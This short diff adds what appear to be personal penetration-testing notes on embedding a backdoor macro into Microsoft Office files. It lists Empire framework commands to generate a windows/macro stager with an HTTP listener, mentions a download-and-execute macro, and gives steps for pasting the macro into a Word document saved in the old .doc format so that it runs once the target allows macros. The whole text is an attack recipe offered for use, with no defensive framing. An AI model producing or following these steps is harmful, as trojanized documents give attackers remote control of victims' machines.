@@ -1,0 +1,18 @@
+embadd a backdoor into ms office (word, pwr point, excel)
+
+the target has to allow macros inside the file
+
+empire can generate macros as well
+    usestager windows/macro
+    info
+    set Listener http
+    set OutFile win.macro
+    execute 
+
+or use downloadExecute.macro
+
+
+To set up:
+    View -> View Macros -> Create -> Copy Paste ---> Save as word 97-2003 (doc)
+
+
